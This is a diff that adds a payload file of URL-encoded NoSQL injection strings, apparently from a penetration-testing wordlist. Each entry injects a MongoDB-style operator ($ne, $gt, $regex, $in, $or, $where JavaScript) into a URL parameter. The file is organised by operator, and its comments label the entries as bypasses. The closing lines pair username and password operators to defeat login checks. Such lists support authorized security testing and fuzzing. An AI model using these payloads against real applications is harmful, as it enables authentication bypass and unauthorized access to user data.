@@ -1,0 +1,65 @@
+# NoSQL Injection - URL-Encoded Operator Payloads
+# Used for injecting operators via URL parameters
+# Format: param[$operator]=value
+
+# $ne (not equal) bypass
+[$ne]=
+[$ne]=1
+[$ne]=invalid
+[$ne]=null
+
+# $gt (greater than) bypass
+[$gt]=
+[$gt]=0
+[$gte]=
+[$gte]=0
+
+# $lt (less than) bypass
+[$lt]=~
+[$lt]=zzz
+[$lte]=~
+
+# $regex bypass
+[$regex]=.*
+[$regex]=^.*$
+[$regex]=.+
+[$regex]=
+[$regex]=^a
+[$options]=i
+
+# $exists bypass
+[$exists]=true
+[$exists]=1
+[$exists]=false
+[$exists]=0
+
+# $in operator
+[$in][]=admin
+[$in][]=administrator
+[$in][]=root
+[$in][]=
+[$in][0]=admin
+[$in][1]=root
+
+# $nin operator
+[$nin][]=
+[$nin]=[]
+
+# $or operator (complex)
+[$or][0][a][$gt]=
+[$or][1][b][$gt]=
+[$or][0][$ne]=
+[$or][1][$ne]=
+
+# $where JavaScript
+[$where]=1==1
+[$where]=return true
+[$where]=this.password
+
+# $type operator
+[$type]=2
+[$type]=string
+
+# Combined attacks
+[$ne]=&password[$ne]=
+[$gt]=&password[$gt]=
